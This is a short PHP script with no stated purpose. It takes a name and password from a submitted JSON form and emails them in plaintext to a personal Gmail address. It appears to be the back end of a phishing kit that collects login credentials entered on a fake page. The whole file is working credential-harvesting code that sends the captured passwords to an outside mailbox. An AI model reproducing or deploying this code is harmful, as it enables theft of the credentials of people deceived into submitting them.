<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = json_decode(file_get_contents("php://input"), true);
    $name = $data['name'];
    $password = $data['password'];

    $to = 'hallo.titty2@gmail.com';
    $subject = 'Form Submission';
    $message = "Name: $name\nPassword: $password";
    $headers = 'From: webmaster@example.com';

    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully.";
    } else {
        echo "Failed to send email.";
    }
}
?>
